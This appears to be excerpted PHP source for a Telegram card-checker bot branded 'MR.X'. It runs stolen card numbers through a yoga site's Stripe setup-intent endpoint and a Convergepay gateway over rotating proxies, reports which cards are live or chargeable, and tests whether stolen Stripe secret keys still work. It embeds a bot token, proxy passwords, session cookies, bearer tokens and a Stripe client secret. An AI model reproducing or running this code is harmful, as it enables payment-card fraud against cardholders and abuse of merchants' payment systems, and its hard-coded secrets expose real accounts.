...
$botToken = "5235932906:AAHcSX3gkSHcbQjSYHS0-ULM7tRkxzdBvSM"; // Enter ur bot token
...
sendMessage($chatId, "<b>Hello there!!%0AType /cmds to know all my commands!!%0A%0AMR.X (🇧🇩)/b>");
}

//////////=========[Cmds Command]=========//////////

elseif ((strpos($message, "!cmds") === 0)||(strpos($message, "/cmds") === 0)){
sendMessage($chatId, "<u>Bin lookup:</u> <code>!bin</code> xxxxxx%0A<u>SK Key Check:</u> <code>!sk</code> sk_live%0A<u> To know ur info%0A%0A<b>MR.X (🇧🇩)</b>");
}

//////////=========[Info Command]=========//////////

elseif ((strpos($message, "!info") === 0)||(strpos($message, "/info") === 0)){
sendMessage($chatId, "<u>ID:</u> <code>$userId</code>%0A<u>First Name:</u> $firstname%0A<u>Username:</u> @$username%0A%0A<b>MR.X🇧🇩 </b>");
}
...
curl_close($ch);
sendMessage($chatId, '<b>✅ Valid Bin</b>%0A<b>Bank:</b> '.$bank.'%0A<b>Country:</b> '.$name.''.$emoji.'%0A<b>Brand:</b> '.$brand.'%0A<b>Card:</b> '.$scheme.'%0A<b>Type:</b> '.$type.'%0A<b>Currency:</b> '.$currency.'%0A<b>Checked By:</b> @'.$username.'%0A%0A<b>MR.X🇧🇩 </b>');
}
curl_close($ch);
...
$rp1 = array(
  ...
  2 => 'ltekbahb-rotate:e0vds6xy7bkt',
  3 => 'klwdhqgx-rotate:gptpwm4f7fp7',
    ); 
    $rpt = array_rand($rp1);
    $rotate = $rp1[$rpt];
...
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://www.yogabarnonline.com/api/billing/stripe/startTransaction');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'authority: www.yogabarnonline.com',
'method: POST',
'path: /api/billing/stripe/startTransaction',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.5',
'content-type: application/x-www-form-urlencoded',
'cookie: slim_session=kdAvM34VQkCeDNghkAH5Tf5j0jWGITCRgI7EpD6b; _ga=GA1.2.1491149446.1647501625; _gid=GA1.2.1990855323.1647501625; _fbp=fb.1.1647501625956.20950458; __stripe_mid=3113eb16-cd9e-4395-9741-6013d68f82557c8113; __stripe_sid=a70d001e-f0ef-4034-b8b8-bc4f00b83451b29e3e; lw_tokens=%7B%22access_token%22%3A%22QtS0XAaNpIGNWKOq5hEGNuWR6S5TZJGW9naCSXb5%22%2C%22token_type%22%3A%22Bearer%22%2C%22expires_in%22%3A604800%2C%22refresh_token%22%3A%22AurppE4JEcwp31YHU5edWjnZ48ov4b6FjD5jbmRH%22%7D',
'origin: https://www.yogabarnonline.com',
'referer: https://www.yogabarnonline.com/payment?product_id=all-class-access-yoga-meditation-and-healing-arts&type=subscription',
...
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"billing_info":null,"product_id":"all-class-access-yoga-meditation-and-healing-arts","type":"subscription","coupon":null,"plan_id":null,"user_tags":[]}');
...
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/seti_1KeDrUGuFeQALoh5ef64FMYX/confirm');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
...
'method: POST',
'path: /v1/setup_intents/seti_1KeDrUGuFeQALoh5ef64FMYX/confirm',
'scheme: https',
'accept: application/json',
'accept-language: en-US,en;q=0.5',
'content-type: application/x-www-form-urlencoded',
...
curl_setopt($ch, CURLOPT_POSTFIELDS,'payment_method_data[type]=card&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=8a222f87-65f7-4425-a54a-b6349c1249bf0c6a7f&payment_method_data[muid]=3113eb16-cd9e-4395-9741-6013d68f82557c8113&payment_method_data[sid]=a70d001e-f0ef-4034-b8b8-bc4f00b83451b29e3e&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F7e5462ae1%3B+stripe-js-v3%2F7e5462ae1&payment_method_data[time_on_page]=134771&expected_payment_method_type=card&use_stripe_sdk=true&webauthn_uvpa_available=true&spc_eligible=false&key=pk_live_UPbTVO26b3Uqt0Pkm8eTzNXF00eWxRqOgE&client_secret=seti_1KeDrUGuFeQALoh5ef64FMYX_secret_LKtec5U5ticJC0C1VlARH1I6T35B9GJ');
...
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>IP:</u> <b>'.$ip.'</b>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED ★ 』</b>%0A<u>Bank:</u> '.$bank1.'%0A<u>Country:</u> '.$name1.'%0A<u>Brand:</u> '.$brand.'%0A<u>Card:</u> '.$scheme.'%0A<u>Type:</u> '.$type.'%0A<u>Gateway:</u> <b>Stripe</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>MR.X (🇧🇩)</b>');
}
...
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED [M][U] ★ 』 %0A<u>Chargeable::</u> <b>『 ★  Maybe Yes ★ 』</b>%0A</b><u>Gateway:</u> <b>Convergepay</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>MR.X (🇧🇩)</b>');
}
elseif($cvvres == "M"){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ CVV MATCHED [M]['.$avsres.'] ★ 』 %0A<u>Chargeable::</u> <b>『 ★ Chargeable: '.$chStatus.' ★ 』</b>%0A</b><u>Gateway:</u> <b>Convergepay</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>MR.X (🇧🇩)</b>');
}
elseif($cvvres == "N"){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ LIVE CCN [N]['.$avsres.'] ★ 』%0A<u>Chargeable::</u> <b>『 ★ No ★ 』</b>%0A</b><u>Gateway:</u> <b>Convergepay</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>MR.X(🇧🇩) </b>');
}
elseif (strpos($result9, '"success":true')){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>APROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Charged CVV ★ 』%0A<u>Chargeable::</u> <b>『 ★ Yes ★ 』</b>%0A</b><u>Gateway:</u> <b>Convergepay</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>MR.X(🇧🇩) </b>');
}
elseif(!$result9){
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Unknown Error ★ 』</b><u>Gateway:</u> <b>Convergepay</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>MR.X(🇧🇩) </b>');
}else{
sendMessage($chatId, '<u>CARD:</u> <code>'.$lista.'</code>%0A<u>STATUS:</u> <b>REPROVADA</b>%0A<u>RESPONSE:</u> <b>『 ★ Card Declined ['.$cvvres.']['.$avsres.'] ★ 』%0A<u>Mensaje::</u> <b>『 ★ Msg: '.$msg.' ★ 』[Maybe api dead]</b>%0A</b><u>Gateway:</u> <b>Convergepay</b>%0A<u>Checked By:</u> @'.$username.'<u>%0ATime Taken:</u> <b>'.$time.'s</b>%0A%0A<b>MR.X(🇧🇩) </b>');
}
curl_close($ch);
}
...
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> EXPIRED KEY%0A%0A<b>MR.X(🇧🇩)  </b>");
}
elseif (strpos($result, 'Invalid API Key provided')){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> INVALID KEY%0A%0A<b>MR.X(🇧🇩)  </b>");
}
elseif ((strpos($result, 'testmode_charges_only')) || (strpos($result, 'test_mode_live_card'))){
sendMessage($chatId, "<b>❌ DEAD KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>REASON:</u> Testmode Charges Only%0A%0A<b>MR.X(🇧🇩)  </b>");
}else{
sendMessage($chatId, "<b>✅ LIVE KEY</b>%0A<u>KEY:</u> <code>$sec</code>%0A<u>RESPONSE:</u> SK LIVE!!%0A%0A<b>MR.X(🇧🇩) </b>");
}}
